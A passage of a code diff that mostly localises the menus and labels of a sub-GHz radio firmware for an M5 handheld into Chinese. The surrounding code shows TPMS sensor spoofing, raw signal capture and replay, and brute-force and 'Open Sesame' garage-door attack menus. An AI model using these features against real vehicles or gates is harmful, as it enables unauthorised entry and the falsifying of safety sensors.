+    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
     if (use_sprite) sprite->pushSprite(0, 0);
     while (true) {
         M5.update(); cardUpdate();
@@ -45173,7 +45452,7 @@ void cc_spectrum_analyzer(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
     const SpecBand bands[] = {
         {"315 MHz", 310.0f, 320.0f}, {"433 MHz", 425.0f, 445.0f},
         {"868 MHz", 860.0f, 875.0f}, {"915 MHz", 905.0f, 925.0f},
-        {"Full",    300.0f, 928.0f},
+        {"全频段",  300.0f, 928.0f},
     };
     int band_idx = 1;
     float view_start = bands[1].start_mhz, view_end = bands[1].end_mhz;
@@ -45226,9 +45505,9 @@ void cc_spectrum_analyzer(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
 
         sp.fillScreen(TFT_BLACK);
         sp.fillRect(0, 0, W, GRAPH_Y, 0x0841); sp.drawFastHLine(0, GRAPH_Y, W, 0xFC00);
-        sp.setTextSize(1); sp.setTextFont(1);
+        evilSetCnFont(sp, 1); evilKeepCnFont(sp);
         sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 4);
-        sp.printf("Spectrum %s", bands[band_idx].name);
+        sp.printf("频谱 %s", bands[band_idx].name);
         float cf = view_start + step * cursor;
         sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(130, 4);
         sp.printf("%.2fMHz %.0fdB", cf, rssi[cursor]);
@@ -45252,7 +45531,7 @@ void cc_spectrum_analyzer(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
         sp.drawFastVLine(cursor, GRAPH_Y + 1, GRAPH_H, TFT_WHITE);
         if (peak_db > -120) {
             sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(W-90, GRAPH_Y+3);
-            sp.printf("Pk:%.1fMHz", peak_freq);
+            sp.printf("峰:%.1fMHz", peak_freq);
             sp.setCursor(W-90, GRAPH_Y+13); sp.printf("   %.0fdBm", peak_db);
         }
         sp.setTextColor(0x5AEB, TFT_BLACK);
@@ -45260,7 +45539,7 @@ void cc_spectrum_analyzer(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
         sp.setCursor(W/2-16, GRAPH_BOT+2); sp.printf("%.1f", (view_start+view_end)/2);
         sp.setCursor(W-36, GRAPH_BOT+2); sp.printf("%.1f", view_end);
         sp.fillRect(0, H-12, W, 12, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
-        sp.setCursor(2, H-10); sp.print("+/-=cur TAB=band ENT=zoom R=rst");
+        sp.setCursor(2, H-10); sp.print("+/-=游标 TAB=频段 ENT=缩放 R=重置");
         if (use_sprite) sprite->pushSprite(0, 0);
     }
     cc_set_frequency(cc_frequencies[cc_freq_idx] * 1000 / 1000000.0f);
@@ -45277,8 +45556,8 @@ void cc_waterfall(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
     struct WfBand { const char* name; float start; float end; };
     const WfBand bands[] = {
         {"315 MHz", 310.0f, 320.0f}, {"433 MHz", 425.0f, 445.0f},
-        {"433 Narrow", 433.0f, 435.0f}, {"868 MHz", 860.0f, 875.0f},
-        {"915 MHz", 905.0f, 925.0f}, {"Full", 300.0f, 928.0f},
+        {"433 窄带", 433.0f, 435.0f}, {"868 MHz", 860.0f, 875.0f},
+        {"915 MHz", 905.0f, 925.0f}, {"全频段", 300.0f, 928.0f},
     };
     const int NB = 6;
     int band_idx = 1;
@@ -45368,12 +45647,12 @@ void cc_waterfall(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
         // Header
         sp.fillRect(0, 0, W, WF_Y, 0x0841);
         sp.drawFastHLine(0, WF_Y, W, 0xFC00);
-        sp.setTextSize(1); sp.setTextFont(1);
+        evilSetCnFont(sp, 1); evilKeepCnFont(sp);
         sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 4);
-        sp.printf("Waterfall %s", bands[band_idx].name);
+        sp.printf("瀑布图 %s", bands[band_idx].name);
         if (peak_db > -110) {
             sp.setTextColor(TFT_CYAN, 0x0841); sp.setCursor(140, 4);
-            sp.printf("Pk:%.2fMHz %.0fdB", peak_freq, peak_db);
+            sp.printf("峰:%.2fMHz %.0fdB", peak_freq, peak_db);
         }
 
         // Spectrum peaks curve (SDR-style, above waterfall)
@@ -45449,7 +45728,7 @@ void cc_waterfall(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
         // Bottom
         sp.fillRect(0, H-12, W, 12, 0x0841);
         sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H-10);
-        sp.printf(",/=nav TAB=band ENT=zm +/-=flr:%.0f", noise_floor);
+        sp.printf(",/=移频 TAB=段 ENT=缩 +/-=噪底:%.0f", noise_floor);
         if (use_sprite) sprite->pushSprite(0, 0);
     }
 
@@ -45609,7 +45888,7 @@ void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
                             keyRelease();
                             bool fsk = false;
                             int nn = tpms_spoof_encode(s0, ekpa, etemp, cc_raw_pulses, CC_MAX_PULSES, &fsk);
-                            if (nn <= 0) est = "encoder N/A (Toyota)";
+                            if (nn <= 0) est = "编码不支持 (Toyota)";
                             else {
                                 cc_isr_stop();
                                 cc_set_frequency(s0.freq);
@@ -45618,7 +45897,7 @@ void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
                                 else     cc_send_raw(cc_raw_pulses, nn, erep);
                                 cc_apply_preset(PRESETS[pidx]); cc_set_frequency(FREQS[fidx]);
                                 cc_set_raw_rx(); cc_isr_start();
-                                est = "SENT";
+                                est = "已发射";
                             }
                             eDraw = 0;
                         }
@@ -45626,20 +45905,20 @@ void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
                         eDraw = millis();
                         sp.fillScreen(TFT_BLACK);
                         sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
-                        sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841);
-                        sp.setCursor(4, 2); sp.printf("SPOOF %s %08lX", s0.proto ? s0.proto : "?", (unsigned long)s0.id);
-                        sp.setTextSize(1);
+                        evilKeepCnFont(sp); evilSetCnFont(sp, 1.5); sp.setTextColor(0xFC00, 0x0841);
+                        sp.setCursor(4, 2); sp.printf("伪造 %s %08lX", s0.proto ? s0.proto : "?", (unsigned long)s0.id);
+                        evilSetCnFont(sp, 1);
                         sp.setTextColor(efield == 0 ? TFT_GREEN : TFT_WHITE, efield == 0 ? TFT_NAVY : TFT_BLACK);
-                        sp.setCursor(6, 28); sp.printf(" Pressure: %.0f kPa (%.2f bar) ", ekpa, ekpa / 100.0f);
+                        sp.setCursor(6, 28); sp.printf(" 胎压: %.0f kPa (%.2f bar) ", ekpa, ekpa / 100.0f);
                         sp.setTextColor(efield == 1 ? TFT_GREEN : TFT_WHITE, efield == 1 ? TFT_NAVY : TFT_BLACK);
-                        sp.setCursor(6, 42); sp.printf(" Temp    : %d C ", etemp);
+                        sp.setCursor(6, 42); sp.printf(" 温度: %d C ", etemp);
                         sp.setTextColor(efield == 2 ? TFT_GREEN : TFT_WHITE, efield == 2 ? TFT_NAVY : TFT_BLACK);
-                        sp.setCursor(6, 56); sp.printf(" Repeat  : %d ", erep);
+                        sp.setCursor(6, 56); sp.printf(" 重复: %d ", erep);
                         sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74);
-                        sp.printf("Band %.2f MHz  %s", s0.freq, fskP ? "FSK" : "OOK");
+                        sp.printf("频段 %.2f MHz  %s", s0.freq, fskP ? "FSK" : "OOK");
                         if (est[0]) { sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(6, 90); sp.print(est); }
                         sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H - 12);
-                        sp.print(";. field  ,/ value  ENT=TX  BACK");
+                        sp.print(";. 项  ,/ 值  ENT=发射  BACK");
                         if (use_sprite) sprite->pushSprite(0, 0);
                         delay(3);
                     }
@@ -45649,32 +45928,32 @@ void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
                 dDraw = millis();
                 TpmsSensor& s = sens[sel];
                 char L[16][40]; int n = 0;
-                snprintf(L[n++], 40, "Proto : %s", s.proto ? s.proto : "?");
-                snprintf(L[n++], 40, "Serial: 0x%08lX", (unsigned long)s.id);
-                snprintf(L[n++], 40, "Press : %.2f bar", s.bar);
+                snprintf(L[n++], 40, "协议  : %s", s.proto ? s.proto : "?");
+                snprintf(L[n++], 40, "序列号: 0x%08lX", (unsigned long)s.id);
+                snprintf(L[n++], 40, "胎压  : %.2f bar", s.bar);
                 snprintf(L[n++], 40, "        %.1f PSI / %.0f kPa", s.bar * 14.5038f, s.kpa);
-                snprintf(L[n++], 40, "Temp  : %d C", s.temp);
-                snprintf(L[n++], 40, "Btn/Fl: 0x%02X    Cnt: 0x%04X", s.btn, s.cnt);
-                if (s.fix) snprintf(L[n++], 40, "Batt  : 0x%02X", (unsigned)s.fix);
-                snprintf(L[n++], 40, "Bits  : %d    TE: %d us", s.Bit, s.te);
-                snprintf(L[n++], 40, "Band  : %.2f MHz", s.freq);
-                snprintf(L[n++], 40, "Preset: %s", s.preset ? s.preset : "?");
-                snprintf(L[n++], 40, "RSSI  : %d dBm", s.rssi);
-                snprintf(L[n++], 40, "Hits  : %lu", (unsigned long)s.hits);
-                snprintf(L[n++], 40, "Age   : %lus  (first %lus)",
+                snprintf(L[n++], 40, "温度  : %d C", s.temp);
+                snprintf(L[n++], 40, "标志  : 0x%02X    计数: 0x%04X", s.btn, s.cnt);
+                if (s.fix) snprintf(L[n++], 40, "电池  : 0x%02X", (unsigned)s.fix);
+                snprintf(L[n++], 40, "位数  : %d    TE: %d us", s.Bit, s.te);
+                snprintf(L[n++], 40, "频段  : %.2f MHz", s.freq);
+                snprintf(L[n++], 40, "调制  : %s", s.preset ? s.preset : "?");
+                snprintf(L[n++], 40, "信号  : %d dBm", s.rssi);
+                snprintf(L[n++], 40, "次数  : %lu", (unsigned long)s.hits);
+                snprintf(L[n++], 40, "活跃  : %lus 前 (首见 %lus)",
                          (unsigned long)((millis() - s.last) / 1000), (unsigned long)((millis() - s.first) / 1000));
                 int maxvis = (H - 16 - 14) / 12;
                 if (dscroll > n - maxvis) dscroll = (n > maxvis) ? n - maxvis : 0;
                 if (dscroll < 0) dscroll = 0;
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
-                sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841);
+                evilKeepCnFont(sp); evilSetCnFont(sp, 1.5); sp.setTextColor(0xFC00, 0x0841);
                 sp.setCursor(4, 2); sp.printf("TPMS #%d/%d  %s", sel + 1, sens_cnt, s.proto ? s.proto : "?");
-                sp.setTextSize(1);
+                evilSetCnFont(sp, 1);
                 int y = 20;
                 for (int i = dscroll; i < n && y < H - 14; i++) { sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, y); sp.print(L[i]); y += 12; }
                 sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H - 12);
-                sp.print(";.scroll ,/sens E=spoof BACK");
+                sp.print(";.滚动 ,/切换 E=伪造 BACK");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2);
             }
@@ -45691,10 +45970,10 @@ void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 16, 0x0841);
             sp.drawFastHLine(0, 16, W, 0xFC00);
-            sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841);
+            evilKeepCnFont(sp); evilSetCnFont(sp, 1.5); sp.setTextColor(0xFC00, 0x0841);
             sp.setCursor(4, 4); sp.printf("TPMS %s %.2f", PNAMES[pidx], FREQS[fidx]);
             // activite compacte a droite (taille 1, bornee) -> ne deborde jamais l'entete
-            sp.setTextSize(1); sp.setTextColor(0xFC00, 0x0841);
+            evilSetCnFont(sp, 1); sp.setTextColor(0xFC00, 0x0841);
             char eb[12];
             if (tpms_edges < 10000UL)        snprintf(eb, sizeof eb, "%lu", tpms_edges);
             else if (tpms_edges < 10000000UL) snprintf(eb, sizeof eb, "%luk", tpms_edges / 1000UL);
@@ -45713,13 +45992,13 @@ void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
             }
             if (sens_cnt == 0) {
                 sp.setTextColor(TFT_YELLOW); sp.setCursor(6, 52);
-                sp.print("Listening... drive to wake sensors");
+                sp.print("正在监听... 行驶唤醒胎压传感器");
                 sp.setTextColor(0x5AEB); sp.setCursor(6, 66);
-                sp.print("TAB: FM476/FM238/AM650  F: freq");
+                sp.print("TAB: FM476/FM238/AM650  F: 频段");
             }
             sp.fillRect(0, H - 14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H - 12);
-            sp.print(";. sel ENT=detail F=frq TAB=AM/FM BACK");
+            sp.print(";.选择 ENT=详情 F=频段 TAB=调制 BACK");
             if (use_sprite) sprite->pushSprite(0, 0);
         }
         delay(2);
@@ -45802,15 +46081,15 @@ bool cc_config_popup(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite,
         redraw = false;
         sp.fillScreen(TFT_BLACK);
         sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Config RF");
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("射频参数配置");
         float mhz = cc_frequencies[freq_idx] / 1000.0f;
         sp.setTextColor(field == 0 ? TFT_GREEN : TFT_WHITE, field == 0 ? TFT_NAVY : TFT_BLACK);
         sp.setCursor(10, 38); sp.printf(" Freq : %.3f MHz ", mhz);
         sp.setTextColor(field == 1 ? TFT_GREEN : TFT_WHITE, field == 1 ? TFT_NAVY : TFT_BLACK);
         sp.setCursor(10, 60); sp.printf(" Mod  : %s ", cc_presets[preset_idx].name);
         sp.setTextColor(0x5AEB, TFT_BLACK);
-        sp.setCursor(6, 92);   sp.print(";/. champ   ,// = -/+");
-        sp.setCursor(6, H - 14); sp.print("BACK = appliquer");
+        sp.setCursor(6, 92);   sp.print(";/. 选字段  ,// = 调节数值");
+        sp.setCursor(6, H - 14); sp.print("退格键 = 应用并保存");
         if (use_sprite) sprite->pushSprite(0, 0);
     }
     return changed;
@@ -45843,7 +46122,7 @@ void cc_draw_decoded_detail(LovyanGFX& sp, const SubGhzDecoded& e) {
         else     sp.printf("Btn:%X", e.btn);
         info_y += 12;
     }
-    if (e.is_rolling) { sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, info_y); sp.print("Rolling code"); info_y += 12; }
+    if (e.is_rolling) { sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, info_y); sp.print("滚动码 (Rolling)"); info_y += 12; }
     if (e.cnt && !e.is_rolling) { sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(10, info_y); sp.printf("Cnt: %d", e.cnt); }
 }
 
@@ -45857,7 +46136,7 @@ void subGhzMenu() {
         free(cc_raw_buf); free(cc_raw_pulses);
         cc_raw_buf = nullptr; cc_raw_pulses = nullptr;
         M5.Display.clear(TFT_BLACK); M5.Display.setCursor(10,60);
-        M5.Display.print("CC1101 alloc failed"); M5.Display.display();
+        M5.Display.print("CC1101 内存分配失败"); M5.Display.display();
         delay(2000); inMenu = true; return;
     }
     memset(cc_raw_buf, 0, CC_RAW_BUF_SIZE * sizeof(int32_t));
@@ -45865,13 +46144,13 @@ void subGhzMenu() {
 
     // Open CC1101
     M5.Display.clear(TFT_BLACK);
-    M5.Display.setTextSize(1); M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1); evilKeepCnFont(M5.Display);
     M5.Display.setTextColor(TFT_ORANGE, TFT_BLACK);
-    M5.Display.setCursor(10, 50); M5.Display.print("Opening CC1101...");
+    M5.Display.setCursor(10, 50); M5.Display.print("正在初始化 CC1101...");
     M5.Display.display();
     if (!cc_open()) {
         M5.Display.setCursor(10, 70); M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-        M5.Display.print("CC1101 not found! Check Cap HAT");
+        M5.Display.print("未找到 CC1101！请检查扩展帽");
         M5.Display.display(); delay(2000);
         free(cc_raw_buf); free(cc_raw_pulses);       // fix fuite 10KB (repetee a chaque ouverture sans HAT)
         cc_raw_buf = nullptr; cc_raw_pulses = nullptr;
@@ -45883,11 +46162,11 @@ void subGhzMenu() {
     if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
-    const char* items[] = {"Read", "Read RAW", "Analyze",
-                           "Saved", "Freq Analyzer",
-                           "Spectrum Analyzer", "Waterfall SDR",
-                           "Brute Force", "TPMS Scan", "ProtoPirate",
-                           "Gates", "OpenSesame"};
+    const char* items[] = {"读取信号", "录制 RAW", "离线分析",
+                           "已存文件", "扫频分析仪",
+                           "频谱分析仪", "瀑布图 SDR",
+                           "暴力穷举", "胎压TPMS扫描", "协议海盗",
+                           "车库门遥控", "芝麻开门攻击"};
     const int cc_item_count = 12;
     // Ordre du menu decouple du numero de handler (evite de renumeroter tous les
     // if(mode==N)). Chaque position d'items[] -> son mode. Analyze=12 inseree en pos 2.
@@ -45907,10 +46186,10 @@ void subGhzMenu() {
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 16, 0x0841);
                 sp.drawFastHLine(0, 16, W, 0xFC00);
-                sp.setTextFont(1);
-                sp.setTextSize(1.5);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(50, 2); sp.print("Cap Sub-GHz");
-                sp.setTextSize(1.5);
+                evilKeepCnFont(sp);
+                evilSetCnFont(sp, 1.5);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(50, 2); sp.print("Sub-GHz 射频工具箱");
+                evilSetCnFont(sp, 1.5);
                 for (int i = 0; i < cc_maxVis && (cc_start + i) < cc_item_count; i++) {
                     int idx = cc_start + i;
                     int y = cc_listY + i * cc_lineH;
@@ -45923,9 +46202,9 @@ void subGhzMenu() {
                     sp.setCursor(10, y + 2); sp.print(items[idx]);
                 }
                 sp.fillRect(0, H - 14, W, 14, 0x0841);
-                sp.setTextSize(1);
+                evilSetCnFont(sp, 1);
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                sp.print(";/. ENT BACK");
+                sp.print(";/. 移动  回车=进入  退格=返回");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 cc_need_draw = false;
             }
@@ -46035,7 +46314,7 @@ void subGhzMenu() {
                         if (nc > 0) cc_save_sub(fn, freq_hz, cc_presets[cc_preset_idx].sub_name, enc, nc);
                         else        cc_save_sub_key(fn, freq_hz, hist[sel]);
                         sp.fillRect(10, 100, 220, 12, TFT_BLACK); sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                        sp.setCursor(10, 100); sp.print("Saved!"); if (use_sprite) sprite->pushSprite(0, 0); delay(400);
+                        sp.setCursor(10, 100); sp.print("已保存！"); if (use_sprite) sprite->pushSprite(0, 0); delay(400);
                         last_draw = 0;
                     }
                 }
@@ -46045,7 +46324,7 @@ void subGhzMenu() {
 
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
-                sp.setTextSize(1); sp.setTextFont(1);
+                evilSetCnFont(sp, 1); evilKeepCnFont(sp);
                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
                 sp.printf("Read %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz / 1000000.0f);
                 sp.setCursor(W - 55, 3); sp.printf("%.0fdBm", cc_get_rssi());
@@ -46056,11 +46335,11 @@ void subGhzMenu() {
                     sp.setCursor(2, 108); sp.printf("#%d/%d  vu x%u", sel + 1, (int)hist.size(), hits[sel]);
                     sp.fillRect(0, H - 14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                    sp.print(";/. prec/suiv S=TX ENT=save BACK");
+                    sp.print(";/. 翻页  S=发射  回车=保存  退格");
                 } else {
                     if (hist.empty()) {
                         sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                        sp.setCursor(28, 55); sp.print("Waiting for signal...");
+                        sp.setCursor(28, 55); sp.print("正在等待接收信号...");
                     } else {
                         int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
                         if (sel < listStart) listStart = sel;
@@ -46079,7 +46358,7 @@ void subGhzMenu() {
                     }
                     sp.fillRect(0, H - 14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                    sp.print(";/. sel ENT=detail C=config BACK");
+                    sp.print(";/. 选择  回车=详情  C=配置  退格");
                 }
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2);
@@ -46207,7 +46486,7 @@ void subGhzMenu() {
 
                 sp.fillRect(0, H - 14, W, 14, 0x0841);
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                sp.print("BACK=stop");
+                sp.print("退格键=停止");
                 if (use_sprite) sprite->pushSprite(0, 0);
             }
 
@@ -46243,17 +46522,17 @@ void subGhzMenu() {
             sp.fillScreen(TFT_BLACK);
             sp.fillRect(0, 0, W, 14, 0x0841);
             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-            sp.print("Capture Complete");
+            sp.print("RAW 信号捕获完成");
             sp.setTextColor(TFT_GREEN, TFT_BLACK);
-            sp.setCursor(10, 22); sp.printf("Total: %lu pulses", total_pulses);
-            sp.setCursor(10, 36); sp.printf("RAM: %d (for replay)", cc_raw_count);
+            sp.setCursor(10, 22); sp.printf("总脉冲数: %lu", total_pulses);
+            sp.setCursor(10, 36); sp.printf("内存缓存: %d (可重放)", cc_raw_count);
             if (has_sd) {
                 sp.setCursor(10, 50); sp.printf("SD: %s", fname + 13);
             } else {
-                sp.setCursor(10, 50); sp.print("No SD card");
+                sp.setCursor(10, 50); sp.print("未检测到存储卡");
             }
             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-            sp.setCursor(10, 72); sp.print("ENTER=Send  BACK=menu");
+            sp.setCursor(10, 72); sp.print("回车=重放发送  退格=返回");
             if (use_sprite) sprite->pushSprite(0, 0);
 
             while (true) {
@@ -46266,17 +46545,17 @@ void subGhzMenu() {
                     uint32_t rfhz; int rcnt;
                     int32_t* rdata = has_sd ? cc_load_sub_malloc(fname, &rfhz, &rcnt) : nullptr;
                     if (rdata && rcnt > 0) {
-                        sp.setCursor(10, 90); sp.printf("Sending %d pulses (SD)...", rcnt);
+                        sp.setCursor(10, 90); sp.printf("正在从 SD 重放 %d 个脉冲...", rcnt);
                         if (use_sprite) sprite->pushSprite(0, 0);
                         cc_send_raw(rdata, rcnt, 10);
                         free(rdata);
                     } else {
-                        sp.setCursor(10, 90); sp.printf("Sending %d pulses (RAM)...", cc_raw_count);
+                        sp.setCursor(10, 90); sp.printf("正在从内存重放 %d 个脉冲...", cc_raw_count);
                         if (use_sprite) sprite->pushSprite(0, 0);
                         cc_send_raw(cc_raw_pulses, min(cc_raw_count, CC_MAX_PULSES), 10);
                     }
                     sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                    sp.setCursor(10, 104); sp.print("Done!");
+                    sp.setCursor(10, 104); sp.print("发送完成！");
                     if (use_sprite) sprite->pushSprite(0, 0);
                     delay(1000);
                 }
@@ -46299,7 +46578,7 @@ void subGhzMenu() {
             if (file_count == 0) {
                 sp.fillScreen(TFT_BLACK);
                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 55); sp.print("No .sub files found");
+                sp.setCursor(10, 55); sp.print("未找到 .sub 录制文件");
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
@@ -46309,7 +46588,7 @@ void subGhzMenu() {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
                     sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-                    sp.printf("Saved (%d files)", file_count);
+                    sp.printf("已存信号 (%d 个文件)", file_count);
                     for (int i = 0; i < visible; i++) {
                         int idx = scroll + i;
                         bool s = (idx == sel);
@@ -46321,7 +46600,7 @@ void subGhzMenu() {
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                    sp.print(";=up .=dn ENT=send D=del");
+                    sp.print(";=上 .=下 回车=发送 D=删除");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     while (true) {
@@ -46377,10 +46656,10 @@ void subGhzMenu() {
                                             sp.setCursor(4, 44); sp.printf("Freq  : %.3f MHz", fhz / 1000000.0f);
                                             sp.setCursor(4, 58); sp.printf("Pulses: %d", cnt);
                                             sp.setTextColor(0x8410, TFT_BLACK);
-                                            sp.setCursor(4, 78); sp.print("RAW (rejouable, non decode)");
+                                            sp.setCursor(4, 78); sp.print("RAW 原始码 (可直接重放)");
                                         }
                                         sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
-                                        sp.print("ENTER/S = RESEND   BACK");
+                                        sp.print("回车/S = 再次重放   退格");
                                         if (use_sprite) sprite->pushSprite(0, 0); ddraw = false;
                                     }
                                     M5.update(); cardUpdate();
@@ -46389,11 +46668,11 @@ void subGhzMenu() {
                                         keyRelease();
                                         cc_set_frequency(fhz / 1000000.0f);
                                         sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(TFT_GREEN, 0x0841);
-                                        sp.setCursor(4, H - 12); sp.printf("Sending %d pulses...", cnt);
+                                        sp.setCursor(4, H - 12); sp.printf("正在发射 %d 个脉冲...", cnt);
                                         if (use_sprite) sprite->pushSprite(0, 0);
                                         cc_send_raw(sub_data, cnt, 10);
                                         sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(TFT_YELLOW, 0x0841);
-                                        sp.setCursor(4, H - 12); sp.print("Done! ENTER/S=re-send BACK");
+                                        sp.setCursor(4, H - 12); sp.print("完成！回车/S=重新发送 退格");
                                         if (use_sprite) sprite->pushSprite(0, 0); delay(400); ddraw = false;
                                     }
                                     delay(10);
@@ -46402,7 +46681,7 @@ void subGhzMenu() {
                             } else {
                                 sp.fillScreen(TFT_BLACK);
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
-                                sp.setCursor(10, 50); sp.print("Failed to load file");
+                                sp.setCursor(10, 50); sp.print("加载文件失败");
                                 if (use_sprite) sprite->pushSprite(0, 0);
                                 delay(1000);
                             }
@@ -46414,11 +46693,11 @@ void subGhzMenu() {
                             String fn_del = files[sel].substring(files[sel].lastIndexOf('/') + 1);
                             sp.fillScreen(TFT_BLACK);
                             sp.setTextColor(TFT_RED, TFT_BLACK);
-                            sp.setCursor(10, 40); sp.print("Delete this file?");
+                            sp.setCursor(10, 40); sp.print("确认删除此文件？");
                             sp.setTextColor(TFT_WHITE, TFT_BLACK);
                             sp.setCursor(10, 60); sp.print(fn_del);
                             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                            sp.setCursor(10, 90); sp.print("ENTER=Yes  BACK=No");
+                            sp.setCursor(10, 90); sp.print("回车=确认删除  退格=取消");
                             if (use_sprite) sprite->pushSprite(0, 0);
                             bool confirmed = false;
                             while (true) {
@@ -46493,8 +46772,8 @@ void subGhzMenu() {
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841);
                 sp.drawFastHLine(0, 14, W, 0xFC00);
-                sp.setTextSize(1); sp.setTextFont(1);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 3); sp.print("Freq Analyzer");
+                evilSetCnFont(sp, 1); evilKeepCnFont(sp);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(4, 3); sp.print("Sub-GHz 扫频分析仪");
                 // seuil courant affiche en haut a droite
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(W - 86, 3);
                 sp.printf("thr %d dBm", rssi_floor);
@@ -46506,7 +46785,7 @@ void subGhzMenu() {
                     sp.setCursor(60, 32); sp.printf("RSSI: %.0f dBm", best);
                 } else {
                     sp.setTextColor(0x8410, TFT_BLACK);
-                    sp.setCursor(60, 20); sp.print("-- no signal --");
+                    sp.setCursor(60, 20); sp.print("-- 无有效信号 --");
                     sp.setTextColor(0x8410, TFT_BLACK);
                     sp.setCursor(60, 32); sp.printf("peak %.0f < thr", best);
                 }
@@ -46531,7 +46810,7 @@ void subGhzMenu() {
                 sp.drawFastHLine(10, fy, W - 20, TFT_YELLOW);
                 sp.fillRect(0, H-14, W, 14, 0x0841);
                 sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                sp.print(",// =thr R=Reset BACK=exit");
+                sp.print(",// =阈值 R=重置 退格=退出");
                 if (use_sprite) sprite->pushSprite(0, 0);
             }
             // Restore frequency
@@ -46566,7 +46845,7 @@ void subGhzMenu() {
             while (true) {
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Brute Force");
